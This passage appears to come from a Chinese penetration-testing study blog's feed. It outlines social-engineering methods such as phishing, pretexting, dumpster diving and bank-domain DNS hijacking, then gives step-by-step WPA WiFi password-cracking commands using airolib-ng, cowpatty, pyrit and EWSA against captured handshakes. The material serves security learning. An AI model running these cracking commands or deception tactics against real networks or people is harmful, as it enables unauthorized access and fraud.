title="方式"></a>方式</h2><ul><li>演讲</li><li>听觉</li><li>视觉一肢体语言</li><li>语言</li><li>触摸</li><li>眼神</li><li>等</li></ul><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><pre class="line-numbers language-none"><code class="language-none">理解最基本的规则，这些最基本的规则是不能被打破。例子三个条件发送接收信息，理解最基本的规则，对于我们的"目标建立交流模型是非常重要的。每个人的实际情况不同，因为经验和观念的不同而导致结果也会各不一样.每个人的实际情况不同，目标对事情的理解、感知、体验、阐述他是有差异的! ! !每个人的实际情况不同，每个人都有自己的私密空间!隐私!(重要)-身体上/精神上<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><ol><li>不要觉得(理所当然)接收者和你的情况是完全一 样的。</li><li>不要觉得(理所当然)接收者会按照你的方式阐述信息。</li><li>不要觉得(理所当然)交流不是一个绝对的，一成不变的事情。 (情商)</li><li>如果有多个人参与交流，应该假设每个人的情况都不相同。</li></ol><h1 id="香农-韦弗-模型"><a href="#香农-韦弗-模型" class="headerlink" title="香农-韦弗-模型"></a>香农-韦弗-模型</h1><p>正如前面所说交流基本含义就是发送一个信息包给既定接收者。 这些信息包含很多的信息源，<br>比如视觉、听觉、触觉、味觉和语言等。这个信息包随着被接收方处理，用于描绘出对方所想要<br>表达的意思。这种评估的方式就是所谓的通信过程。</p><h2 id="鼻祖模型"><a href="#鼻祖模型" class="headerlink" title="鼻祖模型"></a>鼻祖模型</h2><ul><li><p>信息源</p></li><li><p>信息</p></li><li><p>发送器</p></li><li><p>信号</p></li><li><p>信道</p></li><li><p>噪声</p></li><li><p>接收器</p></li><li><p>信息目的地</p></li><li><p>误差概率</p></li><li><p>编码</p></li><li><p>解码</p></li><li><p>信息率</p></li><li><p>信道容量</p></li><li><p>等</p><p><img src="assets/image-20230419160106798.png" alt="image-20230419160106798"></p></li></ul><h2 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h2><p>只是将通信视为发送和接收信息的一种方式</p><ul><li>模型的优势在于比较简单</li><li>模型的优势在于比较通用</li><li>模型的优势在于比较可以量化</li></ul><h2 id="香农-韦弗模型基础"><a href="#香农-韦弗模型基础" class="headerlink" title="香农-韦弗模型基础"></a>香农-韦弗模型基础</h2><p>理论模型</p><ol><li>一个创造信息的信息源</li><li>一个把信息编码为信号的发送方</li><li>一个适合传送信号的信道</li><li>一个从信号中解码(重新构建)出信息的接收方</li><li>一个信息发送的目的地</li></ol><h2 id="香农-韦弗模型分层"><a href="#香农-韦弗模型分层" class="headerlink" title="香农-韦弗模型分层"></a>香农-韦弗模型分层</h2><h3 id="1、技术问题"><a href="#1、技术问题" class="headerlink" title="1、技术问题"></a>1、技术问题</h3><p>信息传送的准确定如何?</p><h3 id="2、语义问题"><a href="#2、语义问题" class="headerlink" title="2、语义问题"></a>2、语义问题</h3><p>信息表达的精确性如何?</p><h3 id="3、-效率问题"><a href="#3、-效率问题" class="headerlink" title="3、 效率问题"></a>3、 效率问题</h3><p>接收到的信息对行为的影响的有效性如何?</p><p>在社会工程学中很重要</p><p>社会工程人员就是想要创建出一个自己想要的行为。</p><h2 id="SMCR通信模型"><a href="#SMCR通信模型" class="headerlink" title="SMCR通信模型"></a>SMCR通信模型</h2><h3 id="大卫贝罗"><a href="#大卫贝罗" class="headerlink" title="大卫贝罗"></a>大卫贝罗</h3><ul><li>发送者-S-常规技巧/态度</li><li>信息-M</li><li>信道-C</li><li>接收者-R</li></ul><p><img src="assets/image-20230419160850169.png" alt="image-20230419160850169"></p><h2 id="SMCR通信模型-1"><a href="#SMCR通信模型-1" class="headerlink" title="SMCR通信模型"></a>SMCR通信模型</h2><p>通信就是信息传播的过程， 这个整个过程由3个层次的规则控制</p><ol><li>符号和表示的形式属性</li><li>符号和表情以及其使用者之间的关系</li><li>符号和标识间的联系以及含义</li></ol><h1 id="制定交流模型"><a href="#制定交流模型" class="headerlink" title="制定交流模型"></a>制定交流模型</h1><h2 id="鼻祖模型-1"><a href="#鼻祖模型-1" class="headerlink" title="鼻祖模型"></a>鼻祖模型</h2><h3 id="信息源"><a href="#信息源" class="headerlink" title="信息源"></a>信息源</h3><p>社会工程人员(黑客、特务)就是要传播的信息或交流的源。</p><h3 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h3><p>I 就是我们向接收者传递的/传达的/内容。</p><h3 id="信道"><a href="#信道" class="headerlink" title="信道"></a>信道</h3><p>就是传播的方式/传达的方式。</p><h3 id="接收方"><a href="#接收方" class="headerlink" title="接收方"></a>接收方</h3><p>就是目标。</p><h3 id="反馈"><a href="#反馈" class="headerlink" title="反馈"></a>反馈</h3><p>当有效地将信息传达出去，你(社 工人员)希望对方给予回应。</p><h1 id="案例一"><a href="#案例一" class="headerlink" title="[案例一]"></a>[案例一]</h1><h2 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h2><p>比如写一个网络钓鱼</p><h2 id="登门拜访"><a href="#登门拜访" class="headerlink" title="登门拜访"></a>登门拜访</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/31-she-hui-gong-cheng-xue/di-1-zhang-she-hui-gong-cheng-xue/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/31-she-hui-gong-cheng-xue/di-1-zhang-she-hui-gong-cheng-xue/</url>
      
        <content type="html"><![CDATA[<h1 id="1、什么是社会工程学"><a href="#1、什么是社会工程学" class="headerlink" title="1、什么是社会工程学"></a>1、什么是社会工程学</h1><ol><li>人性的漏洞 </li><li>欺骗的艺术</li></ol><p>通过人性的漏洞、欺骗的艺术，通过让目标(受害人)、心理弱点、本能反应、好奇心、信任、贪婪等心理缺陷，进行Z骗、伤害、审讯、破坏计算 机系统、钓鱼等的危害手段。</p><h2 id="简单的说在整个信息安全的-环节中，-人的因素是最弱的一环。"><a href="#简单的说在整个信息安全的-环节中，-人的因素是最弱的一环。" class="headerlink" title="简单的说在整个信息安全的 环节中， 人的因素是最弱的一环。"></a>简单的说在整个信息安全的 环节中， 人的因素是最弱的一环。</h2><h2 id="社会工程就是利用人的薄弱环节。"><a href="#社会工程就是利用人的薄弱环节。" class="headerlink" title="社会工程就是利用人的薄弱环节。"></a>社会工程就是利用人的薄弱环节。</h2><h2 id="通过欺骗的手段而入侵计算机系统达到攻击一种方式。"><a href="#通过欺骗的手段而入侵计算机系统达到攻击一种方式。" class="headerlink" title="通过欺骗的手段而入侵计算机系统达到攻击一种方式。"></a>通过欺骗的手段而入侵计算机系统达到攻击一种方式。</h2><h3 id="酒店"><a href="#酒店" class="headerlink" title="酒店"></a>酒店</h3><h4 id="无线安全"><a href="#无线安全" class="headerlink" title="无线安全"></a>无线安全</h4><h5 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h5><p><a href="http://www.baidu.com/">www.baidu.com</a></p><p> <a href="http://www.mashibing.com/">www.mashibing.com</a> </p><p>xxx </p><h5 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h5><p>网购-网购链接-9.9 巴黎世家-299 </p><p>网购 -ICBC链接-WWW.ICBC.COM -网络安全</p><p>内部网络-内网DNS-</p><p><a href="WWW.ICBC.COM">WWW.ICBC.COM</a> -10.0.0.135 -前端技术 -账号 -密码</p><p><a href="WWW.ICBC.COM.CN">WWW.ICBC.COM.CN</a></p><h3 id="家"><a href="#家" class="headerlink" title="家"></a>家</h3><h3 id="火车站"><a href="#火车站" class="headerlink" title="火车站"></a>火车站</h3><h3 id="机场"><a href="#机场" class="headerlink" title="机场"></a>机场</h3><h3 id="公交车"><a href="#公交车" class="headerlink" title="公交车"></a>公交车</h3><h3 id="地铁"><a href="#地铁" class="headerlink" title="地铁"></a>地铁</h3><h1 id="2、社会工程学用途？"><a href="#2、社会工程学用途？" class="headerlink" title="2、社会工程学用途？"></a>2、社会工程学用途？</h1><ol><li>网路设备 admin admin 数据库保存</li><li>身份鉴别系统</li><li>防火墙系统</li><li>内网穿透</li><li>入侵检测系统 规则 流量分析</li><li>加密系统</li><li>邮件系统</li><li>IM系统</li><li>等</li></ol><h1 id="3、如何使用社会工程学"><a href="#3、如何使用社会工程学" class="headerlink" title="3、如何使用社会工程学"></a>3、如何使用社会工程学</h1><ol><li>聊天、交谈、欺骗、假冒等方式 </li><li>邮件系统/发送/欺骗/广告/假冒/工作 </li><li>利用离职员工/OA/密码/VPN/聊天 </li><li>信息收集 公司 某一个员工 1381xxx1234 名字 工作ID 公司 钉钉 邮箱 liyanliang lyl </li><li>社工工程师</li></ol><h1 id="4、使用社会工程的步骤"><a href="#4、使用社会工程的步骤" class="headerlink" title="4、使用社会工程的步骤"></a>4、使用社会工程的步骤</h1><h2 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><h2 id="2、换位思考"><a href="#2、换位思考" class="headerlink" title="2、换位思考"></a>2、换位思考</h2><h2 id="3、信息源"><a href="#3、信息源" class="headerlink" title="3、信息源"></a>3、信息源</h2><ol><li>从公开的网站上收集信息 </li><li>通过聊天、交谈、欺骗、冒充 </li><li>运用你的观察力/观察的力量 </li><li>碎纸机/垃圾桶/垃圾堆找信息 信号卡账单 </li><li>信息分析的软件</li></ol><h2 id="4、交流模型"><a href="#4、交流模型" class="headerlink" title="4、交流模型"></a>4、交流模型</h2><ol><li>交流策略 </li><li>交流模型 信息-视觉 听觉 触觉 语言 </li><li>信息传递</li></ol><h2 id="5、反馈"><a href="#5、反馈" class="headerlink" title="5、反馈"></a>5、反馈</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi16-wpa-shen-tou-shi-yong-airolib-ng-chuang-jian-cai-hong-biao-jia-su/di-16-zhang-wpa-shen-tou-shi-yong-airolib-ng-chuang-jian-cai-hong-biao-jia-su/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi16-wpa-shen-tou-shi-yong-airolib-ng-chuang-jian-cai-hong-biao-jia-su/di-16-zhang-wpa-shen-tou-shi-yong-airolib-ng-chuang-jian-cai-hong-biao-jia-su/</url>
      
        <content type="html"><![CDATA[<h1 id="WPA渗透-使用airolib-ng创建彩虹表加速"><a href="#WPA渗透-使用airolib-ng创建彩虹表加速" class="headerlink" title="WPA渗透-使用airolib-ng创建彩虹表加速"></a>WPA渗透-使用airolib-ng创建彩虹表加速</h1><h2 id="1-什么是彩虹表"><a href="#1-什么是彩虹表" class="headerlink" title="1.什么是彩虹表?"></a>1.什么是彩虹表?</h2><p>彩虹表是一一个用于加密散列函数逆运算的预先计算好的表，为破解密码的散列值(或称哈希值、微缩图、摘要、指纹、哈希密文)而准备。一般主流的彩虹表都在100GB以上。这样的表常常用于恢复由有限集字符组成的固定长度的纯文本密码。</p><h2 id="2-渗透wifi"><a href="#2-渗透wifi" class="headerlink" title="2.渗透wifi"></a>2.渗透wifi</h2><h3 id="1-创建数据库名"><a href="#1-创建数据库名" class="headerlink" title="1.创建数据库名"></a>1.创建数据库名</h3><pre class="line-numbers language-none"><code class="language-none">airolib-ng [数据库名] --import essid [一个或者多个ssid的文件]airolib-ng RINBOW1 --import essid wifi.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230419144927041.png" alt="image-20230419144927041"></p><h3 id="2-将字典导入数据库"><a href="#2-将字典导入数据库" class="headerlink" title="2.将字典导入数据库"></a>2.将字典导入数据库</h3><pre class="line-numbers language-none"><code class="language-none">airolib-ng [数据库名] --import passwd [字典]airolib-ng RINBOW1 --import passwd /root/wifi/passwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-生成渗透wifi密码的PMK"><a href="#3-生成渗透wifi密码的PMK" class="headerlink" title="3.生成渗透wifi密码的PMK"></a>3.生成渗透wifi密码的PMK</h3><pre class="line-numbers language-none"><code class="language-none">airolib-ng [ 数据库名] --batchairolib-ng RINBOW1 --batch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-生成需要渗透wifi的彩虹表"><a href="#4-生成需要渗透wifi的彩虹表" class="headerlink" title="4.生成需要渗透wifi的彩虹表"></a>4.生成需要渗透wifi的彩虹表</h3><pre class="line-numbers language-none"><code class="language-none">airolib-ng [数据库名] --export cowpatty [ssid][表名]airolib-ng RINBOW1 --export cowpatty cisco-1809 R_RINBOW1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="5-渗透wifi"><a href="#5-渗透wifi" class="headerlink" title="5.渗透wifi"></a>5.渗透wifi</h3><pre class="line-numbers language-none"><code class="language-none">cowpatty -s [ssid] -d [表名] -r [抓到的cap握手包]cowpatty -s cisC0-1809 -d R_RINBOW1 -r wpa-1-01.cap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi15-wpa-shen-tou-pyrit-batch-table-jia-su-attack-db-mo-kuai-jia-su-attack-db-mo-kuai-jia-su/di-15-zhang-wpa-shen-tou-pyrit-batch-table-jia-su-attack-db-mo-kuai-jia-su-attack-db-mo-kuai-jia-su/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi15-wpa-shen-tou-pyrit-batch-table-jia-su-attack-db-mo-kuai-jia-su-attack-db-mo-kuai-jia-su/di-15-zhang-wpa-shen-tou-pyrit-batch-table-jia-su-attack-db-mo-kuai-jia-su-attack-db-mo-kuai-jia-su/</url>
      
        <content type="html"><![CDATA[<h1 id="WPA渗透-pyrit：batch-table加速attack-db模块加速-“attack-db”模块加速"><a href="#WPA渗透-pyrit：batch-table加速attack-db模块加速-“attack-db”模块加速" class="headerlink" title="WPA渗透-pyrit：batch-table加速attack_db模块加速_“attack_db”模块加速"></a>WPA渗透-pyrit：batch-table加速attack_db模块加速_“attack_db”模块加速</h1><h2 id="1-渗透WIFI"><a href="#1-渗透WIFI" class="headerlink" title="1.渗透WIFI"></a>1.渗透WIFI</h2><p>1.导入密码字典</p><pre class="line-numbers language-none"><code class="language-none">pyrit -i 字典文件 import_passwords-i：输入的文件名import_passwords：从类文件源导入密码。pyrit -i /root/wifi/pwd.txt import_passwords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.导入essid，破解完成记得删除</p><pre class="line-numbers language-none"><code class="language-none">pyrit -e wifi名称 create_essid-e：按ESSID过滤AccessPointcreate_essid：创建一个新的ESSIDdelete_essid：从数据库中删除一个ESSIDpyrit -e cisco-1809 create_essid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="images/290bdf72849448e69d448042809d99f1.png" alt="image.png"></p><p>3.批处理数据库,速度比较慢，耐心等待</p><pre class="line-numbers language-none"><code class="language-none">pyrit batch batch：批处理数据库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="images/a3a6aeea675d496a9c14dc1a68b3cb3c.png" alt="image.png"></p><p>4.batch-table(批处理数据库)加速渗透wifi</p><pre class="line-numbers language-none"><code class="language-none">pyrit -e WiFi名称 -r cap包 attack_batchattack_batch：攻击从数据库的PMKs/密码握手-r：pcap格式的数据包捕获源pyrit -e cisco-1809 -r wpa-1-01.cap attack_batch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="images/d7deff080cfa46d3a7b77106d1949108.png" alt="image.png"></p><p>5.attack_db 加速渗透wifi</p><pre class="line-numbers language-none"><code class="language-none">pyrit -e WiFi名称 -r cap包 attack_dbattack_db：攻击与数据库中的PMK握手-r：pcap格式的数据包捕获源pyrit -e cisco-1809 -r wpa-1-01.cap attack_db<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="images/7327ae375337438abb00e7aa60142233.png" alt="image.png"></p><p>6.batch-table和hash-table对比</p><p>相同点：生成起来都很慢</p><p>不同点：hash-table可以分享给别人用，batch-table只能自己用</p><p>弊端：需要生成batch-table 字典越大生成越慢</p><p>优势：生成batch-table后，渗透速度指数级提升</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi14-wpa-shen-tou-pyrit-gpu-jia-su-hash-table/di-14-zhang-wpa-shen-tou-pyrit-gpu-jia-su-hash-table/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi14-wpa-shen-tou-pyrit-gpu-jia-su-hash-table/di-14-zhang-wpa-shen-tou-pyrit-gpu-jia-su-hash-table/</url>
      
        <content type="html"><![CDATA[<h1 id="WPA渗透-pyrit：GPU加速-Hash-table"><a href="#WPA渗透-pyrit：GPU加速-Hash-table" class="headerlink" title="WPA渗透-pyrit：GPU加速_Hash-table"></a>WPA渗透-pyrit：GPU加速_Hash-table</h1><h2 id="1-pyrit工具介绍"><a href="#1-pyrit工具介绍" class="headerlink" title="1.pyrit工具介绍"></a>1.pyrit工具介绍</h2><p>pyrit是一款开源且完全免费的软件，任何人都可以检查，复制或修改它。它在各种平台上编译和执行，包括FreeBSD、MacOS X和Linux作为操作系统以及x86、alpha、arm等处理器。</p><p>使用pyrit工具最大的优点，在于它可以使用除CPU之外的GPU运算加速生成彩虹表，本身支持抓包获取四步握手过程，无须使用airodump抓包，如果已经通过ariodump抓取数据，也可以使用pyrit进行读取。</p><h2 id="2-安装pyrit"><a href="#2-安装pyrit" class="headerlink" title="2.安装pyrit"></a>2.安装pyrit</h2><p>1.修改更新源</p><pre class="line-numbers language-none"><code class="language-none">vim /etc/apt/sources.listdeb http://mirrors.ustc.edu.cn/debian/ buster main contrib non-freedeb http://mirrors.ustc.edu.cn/debian/ buster-updates main contrib non-freedeb http://mirrors.ustc.edu.cn/debian/ buster-backports main contrib non-freedeb http://mirrors.ustc.edu.cn/debian-security buster/updates main contrib non-free<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.更新安装源</p><p><code>apt-get update &amp;&amp; apt-get upgrade</code></p><p>3.下载pyrit</p><p><code>apt-get install pyrit</code></p><p><img src="images/4919430750de4c8290143fbca1cb8e75.png" alt="image.png"></p><h2 id="3-安装scapy到指定目录步骤"><a href="#3-安装scapy到指定目录步骤" class="headerlink" title="3.安装scapy到指定目录步骤"></a>3.安装scapy到指定目录步骤</h2><p>1、下载scapy：</p><p><code>wget -v https://github.com/secdev/scapy/archive/v2.3.2.tar.gz</code></p><p>或者将附件里的scapy-2.3.2.tar.gz拷贝到kali</p><p>2、解压后进入目录执行：</p><pre class="line-numbers language-none"><code class="language-none">tar -xzvf tar -xzvf scapy-2.3.2.tar.gzcd scapy-2.3.2 python2 setup.py build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3.安装</p><p><code>python2 setup.py install</code></p><p><img src="images/2327d8c42b754d94aca354023bb40144.png" alt="image.png"></p><h2 id="4-渗透wifi"><a href="#4-渗透wifi" class="headerlink" title="4.渗透wifi"></a>4.渗透wifi</h2><p>1.分析握手包信息</p><pre class="line-numbers language-none"><code class="language-none">pyrit -r cap包 analyze-r：pcap格式的数据包捕获源analyze：分析数据包捕获文件pyrit -r wpa-1-01.cap analyze<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="images/20c48a2d1b754004a62b09bd410b92e9.png" alt="image.png"></p><p>2.密码字典渗透WiFi</p><pre class="line-numbers language-none"><code class="language-none">pyrit -r 握手包 -i 字典 -b bssid attack_passthrough-i：输入的文件名-b：按BSSID筛选AccessPointattack_passthrough：用文件中的密码攻击握手pyrit -r wpa-1-01.cap -i /root/wifi/pwd.txt -b d8:24:bd:79:18:0b attack_passthrough<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="images/b3e8a66de47e4b42b7aefa54b1bd8b81.png" alt="image.png"></p><p>3.hash-table加速渗透wifi</p><pre class="line-numbers language-none"><code class="language-none">pyrit -r 握手包 -i 哈希列表 -b bssid attack_cowpattyattack_cowpatty：攻击一个来自cowpatty文件的PMK握手pyrit -r wpa-1-01.cap -i /root/wifi/pwdhash -b d8:24:bd:79:18:0b attack_cowpatty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="images/7ac4842f07af45edb5f292983a01215a.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi13-wpa-po-jie-windows-xia-gpu-pao-bao-jia-su/di-13-zhang-wpa-po-jie-windows-xia-gpu-pao-bao-jia-su/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi13-wpa-po-jie-windows-xia-gpu-pao-bao-jia-su/di-13-zhang-wpa-po-jie-windows-xia-gpu-pao-bao-jia-su/</url>
      
        <content type="html"><![CDATA[<h1 id="WPA破解-windows下GPU跑包加速"><a href="#WPA破解-windows下GPU跑包加速" class="headerlink" title="WPA破解-windows下GPU跑包加速"></a>WPA破解-windows下GPU跑包加速</h1><p>实现GPU加速的前提条件：</p><p>英伟达公司 设计的 计算统一设备架构</p><p>AMD 设计的 流开放计算库  openCL</p><p>通过这两个技术，可以让显卡帮我们进行计算渗透</p><h2 id="1-EWSA软件介绍"><a href="#1-EWSA软件介绍" class="headerlink" title="1.EWSA软件介绍"></a>1.EWSA软件介绍</h2><p>一个非常不错的网络网络破解工具，可以直接破解握手包，xp系统下速度非常快。<strong>EWSA</strong>全称Elcomsoft Wireless Security Auditor。号称可以利用GPU的运算性能快速攻破无线网络密码，运算速度相比使用CPU可提高最多上百倍。本软件的工作方式很简单，就是利用词典去暴力找回无线AP上的WPA和WPA2密码，还支持字母大小写、数字替代、符号顺序变换、缩写、元音替换等12种变量设定，在ATI和NVIDIA显卡上均可使用。使用该软件前要事先抓好<strong>WPA握手包</strong>。</p><h2 id="2-软件安装教程"><a href="#2-软件安装教程" class="headerlink" title="2.软件安装教程"></a>2.软件安装教程</h2><h3 id="1-双击ewsa-setup-en-exe"><a href="#1-双击ewsa-setup-en-exe" class="headerlink" title="1.双击ewsa_setup_en.exe"></a>1.双击ewsa_setup_en.exe</h3><h3 id="2-选择next"><a href="#2-选择next" class="headerlink" title="2.选择next"></a>2.选择next</h3><p><img src="images/image-20211216111056125.png" alt="image-20211216111056125"></p><h3 id="3-选择Accept"><a href="#3-选择Accept" class="headerlink" title="3.选择Accept"></a>3.选择Accept</h3><p><img src="images/image-20211216111115928.png" alt="image-20211216111115928"></p><h3 id="4-点击next"><a href="#4-点击next" class="headerlink" title="4.点击next"></a>4.点击next</h3><p><img src="images/image-20211216111130335.png" alt="image-20211216111130335"></p><h3 id="5-点击next"><a href="#5-点击next" class="headerlink" title="5.点击next"></a>5.点击next</h3><p><img src="images/image-20211216111145769.png" alt="image-20211216111145769"></p><h3 id="6-选择安装位置-点击next"><a href="#6-选择安装位置-点击next" class="headerlink" title="6.选择安装位置 点击next"></a>6.选择安装位置 点击next</h3><p><img src="images/image-20211216111200166.png" alt="image-20211216111200166"></p><h3 id="7-点击Install"><a href="#7-点击Install" class="headerlink" title="7.点击Install"></a>7.点击Install</h3><p><img src="images/image-20211216111214296.png" alt="image-20211216111214296"></p><h3 id="8-点击-【是】"><a href="#8-点击-【是】" class="headerlink" title="8.点击 【是】"></a>8.点击 【是】</h3><p><img src="images/image-20211216111226958.png" alt="image-20211216111226958"></p><h3 id="9-点击Finsh"><a href="#9-点击Finsh" class="headerlink" title="9.点击Finsh"></a>9.点击Finsh</h3><p><img src="images/image-20211216111240457.png" alt="image-20211216111240457"></p><h3 id="10-点击-【是】"><a href="#10-点击-【是】" class="headerlink" title="10.点击 【是】"></a>10.点击 【是】</h3><p><img src="images/image-20211216111254216.png" alt="image-20211216111254216"></p><h3 id="11-点击-【ok】"><a href="#11-点击-【ok】" class="headerlink" title="11.点击 【ok】"></a>11.点击 【ok】</h3><p><img src="images/image-20211216111307482.png" alt="image-20211216111307482"></p><h3 id="12-点击Help"><a href="#12-点击Help" class="headerlink" title="12.点击Help"></a>12.点击Help</h3><p><img src="images/image-20211216111320848.png" alt="image-20211216111320848"></p><h3 id="13-点击-激活码"><a href="#13-点击-激活码" class="headerlink" title="13.点击 激活码"></a>13.点击 激活码</h3><p><img src="images/image-20211216111337073.png" alt="image-20211216111337073"></p><h3 id="14-输入激活码，点击OK"><a href="#14-输入激活码，点击OK" class="headerlink" title="14.输入激活码，点击OK"></a>14.输入激活码，点击OK</h3><p><img src="images/image-20211216111355007.png" alt="image-20211216111355007"></p><p><img src="images/image-20211216111402103.png" alt="image-20211216111402103"></p><h3 id="15-点击确定"><a href="#15-点击确定" class="headerlink" title="15.点击确定"></a>15.点击确定</h3><p><img src="images/image-20211216111418424.png" alt="image-20211216111418424"></p><h3 id="16-点击-Options-选择Language-选择chinese"><a href="#16-点击-Options-选择Language-选择chinese" class="headerlink" title="16.点击 Options 选择Language  选择chinese"></a>16.点击 Options 选择Language  选择chinese</h3><p><img src="images/image-20211216111439413.png" alt="image-20211216111439413"></p><h2 id="3-渗透wifi步骤"><a href="#3-渗透wifi步骤" class="headerlink" title="3.渗透wifi步骤"></a>3.渗透wifi步骤</h2><h3 id="1-将握手包文件和密码拷贝到自己喜欢的目录"><a href="#1-将握手包文件和密码拷贝到自己喜欢的目录" class="headerlink" title="1.将握手包文件和密码拷贝到自己喜欢的目录"></a>1.将握手包文件和密码拷贝到自己喜欢的目录</h3><p><img src="images/image-20211216111518457.png" alt="image-20211216111518457"></p><h3 id="2-点击【选项】–【CPU选项】"><a href="#2-点击【选项】–【CPU选项】" class="headerlink" title="2.点击【选项】–【CPU选项】"></a>2.点击【选项】–【CPU选项】</h3><p><img src="images/image-20211216111532855.png" alt="image-20211216111532855"></p><h3 id="3-点击【自动检测】，在点击【OK】"><a href="#3-点击【自动检测】，在点击【OK】" class="headerlink" title="3.点击【自动检测】，在点击【OK】"></a>3.点击【自动检测】，在点击【OK】</h3><p><img src="images/image-20211216111546269.png" alt="image-20211216111546269"></p><h3 id="4-点击【选项】–【GPU选项】"><a href="#4-点击【选项】–【GPU选项】" class="headerlink" title="4.点击【选项】–【GPU选项】"></a>4.点击【选项】–【GPU选项】</h3><p><img src="images/image-20211216111602758.png" alt="image-20211216111602758"></p><h3 id="5-选择显卡，点击【OK】"><a href="#5-选择显卡，点击【OK】" class="headerlink" title="5.选择显卡，点击【OK】"></a>5.选择显卡，点击【OK】</h3><p><img src="images/image-20211216111615926.png" alt="image-20211216111615926"></p><h3 id="6-点击【导入数据】，选择【TCPDUMP文件】"><a href="#6-点击【导入数据】，选择【TCPDUMP文件】" class="headerlink" title="6.点击【导入数据】，选择【TCPDUMP文件】"></a>6.点击【导入数据】，选择【TCPDUMP文件】</h3><p><img src="images/image-20211216111631484.png" alt="image-20211216111631484"></p><h3 id="7-选则握手包文件，点击【打开】"><a href="#7-选则握手包文件，点击【打开】" class="headerlink" title="7.选则握手包文件，点击【打开】"></a>7.选则握手包文件，点击【打开】</h3><p><img src="images/image-20211216111645315.png" alt="image-20211216111645315"></p><h3 id="8-选则握手，点击【ok】"><a href="#8-选则握手，点击【ok】" class="headerlink" title="8.选则握手，点击【ok】"></a>8.选则握手，点击【ok】</h3><p><img src="images/image-20211216111702095.png" alt="image-20211216111702095"></p><p><img src="images/image-20211216111710910.png" alt="image-20211216111710910"></p><h3 id="9-点击破解选项"><a href="#9-点击破解选项" class="headerlink" title="9.点击破解选项"></a>9.点击破解选项</h3><p><img src="images/image-20211216111725518.png" alt="image-20211216111725518"></p><h3 id="10-选则【字典破解】，点击【添加】"><a href="#10-选则【字典破解】，点击【添加】" class="headerlink" title="10.选则【字典破解】，点击【添加】"></a>10.选则【字典破解】，点击【添加】</h3><p><img src="images/image-20211216111738896.png" alt="image-20211216111738896"></p><h3 id="11-选择【pwd-txt】密码字典，点击【打开】"><a href="#11-选择【pwd-txt】密码字典，点击【打开】" class="headerlink" title="11.选择【pwd.txt】密码字典，点击【打开】"></a>11.选择【pwd.txt】密码字典，点击【打开】</h3><p><img src="images/image-20211216111752050.png" alt="image-20211216111752050"></p><h3 id="12-点击【应用】，点击【确定】"><a href="#12-点击【应用】，点击【确定】" class="headerlink" title="12.点击【应用】，点击【确定】"></a>12.点击【应用】，点击【确定】</h3><p><img src="images/image-20211216111823594.png" alt="image-20211216111823594"></p><h3 id="13-点击【开始破解】-选择【字典破解】"><a href="#13-点击【开始破解】-选择【字典破解】" class="headerlink" title="13.点击【开始破解】-选择【字典破解】"></a>13.点击【开始破解】-选择【字典破解】</h3><p><img src="images/image-20211216111843021.png" alt="image-20211216111843021"></p><h3 id="14-点击保存"><a href="#14-点击保存" class="headerlink" title="14.点击保存"></a>14.点击保存</h3><p><img src="images/image-20211216111856491.png" 